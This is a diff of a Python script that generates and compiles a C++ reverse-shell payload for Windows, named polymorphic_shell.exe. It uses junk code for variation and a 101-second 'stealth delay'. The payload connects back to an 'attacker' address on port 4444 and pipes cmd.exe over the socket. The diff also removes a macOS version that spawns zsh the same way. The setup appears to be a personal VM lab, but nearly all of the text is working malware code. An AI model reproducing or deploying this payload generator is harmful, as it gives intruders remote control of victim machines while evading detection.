@@ -17,42 +17,46 @@ void {func_name}() {{
 def generate_cpp_source(ip, port):
     junk = "\n".join([generate_junk() for _ in range(5)])
     
-    # Updated Template with ANSI fixes and Delay
+    # WINDOWS VERSION: Connects FROM VM TO MAC
     cpp_code = f"""
 #include <winsock2.h>
 #include <windows.h>
 #include <stdio.h>
-#pragma comment(lib, "Ws2_32.lib")
+
+#pragma comment(lib, "ws2_32.lib")
 
 {junk}
 
 int main() {{
-    // Requirement: Execution delay
-    printf("[INFO] Execution delayed by 101 seconds...\\n");
+    // 1. STEALTH DELAY (101 Seconds)
     Sleep(101000); 
 
-    FreeConsole(); 
+    // 2. WINSOCK STARTUP
     WSADATA wsaData;
-    SOCKET s;
-    struct sockaddr_in addr;
-    STARTUPINFOA si; // Use ANSI version
-    PROCESS_INFORMATION pi;
+    WSAStartup(MAKEWORD(2,2), &wsaData);
 
-    WSAStartup(MAKEWORD(2, 2), &wsaData);
-    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+    // 3. CREATE WINDOWS SOCKET
+    SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+    
+    struct sockaddr_in serv_addr;
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons({4444});
+    
+    // This is your Mac's IP address (the Attacker)
+    serv_addr.sin_addr.s_addr = inet_addr("192.168.64.1");
 
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons({port});
-    addr.sin_addr.s_addr = inet_addr("{ip}");
-
-    if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == 0) {{
-        memset(&si, 0, sizeof(si));
+    // 4. CONNECT BACK TO MAC
+    if (WSAConnect(sock, (SOCKADDR*)&serv_addr, sizeof(serv_addr), NULL, NULL, NULL, NULL) == 0) {{
+        STARTUPINFOA si = {{0}};
+        PROCESS_INFORMATION pi = {{0}};
         si.cb = sizeof(si);
         si.dwFlags = STARTF_USESTDHANDLES;
-        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
+        
+        // Redirect the Windows CMD to the Mac terminal
+        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
 
-        char command[] = "cmd.exe"; 
-        CreateProcessA(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+        char cmd[] = "cmd.exe"; 
+        CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
     }}
     return 0;
 }}
@@ -62,7 +66,7 @@ int main() {{
 
 def compile_payload(output_name):
     # This is the script that "loads the books" for the compiler
-    vcvars_path = r"C:\Program Files (x86)\Microsoft Visual Studio\18\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
+    vcvars_path = r"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
     
     print(f"[*] Compiling {output_name} via Environment Shell...")
     
@@ -80,45 +84,5 @@ def compile_payload(output_name):
 
 if __name__ == "__main__":
     # Use your Mac's IP address (the 'Attacker' machine)
-    generate_cpp_source("192.168.0.121", 4444) 
+    generate_cpp_source("192.168.64.1", 4444) 
     compile_payload("polymorphic_shell.exe")
-
-
-""" for mac
-#include <iostream>
-#include <sys/socket.h>
-#include <arpa/inet.h>
-#include <netinet/in.h>
-#include <unistd.h>
-
-int main() {
-    // 1. THE STEALTH DELAY (101 Seconds)
-    // On Mac/Linux, sleep() takes seconds, not milliseconds!
-    sleep(101); 
-
-    // 2. CREATE THE SOCKET
-    int sock = socket(AF_INET, SOCK_STREAM, 0);
-    
-    struct sockaddr_in serv_addr;
-    serv_addr.sin_family = AF_INET;
-    serv_addr.sin_port = htons(4444);
-    
-    // REPLACE THIS WITH YOUR MAC'S IP (OR THE IP OF YOUR LISTENER)
-    inet_pton(AF_INET, "192.168.x.x", &serv_addr.sin_addr);
-
-    // 3. CONNECT TO THE ATTACKER (Your Mac's Netcat)
-    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == 0) {
-        
-        // 4. THE MAGIC: Redirect Input/Output/Error to the socket
-        // 0 = stdin, 1 = stdout, 2 = stderr
-        for (int i = 0; i <= 2; i++) {
-            dup2(sock, i);
-        }
-
-        // 5. SPAWN THE MAC SHELL (ZSH is the default on modern Macs)
-        char *args[] = {(char *)"/bin/zsh", NULL};
-        execve(args[0], args, NULL);
-    }
-
-    return 0;
-} """
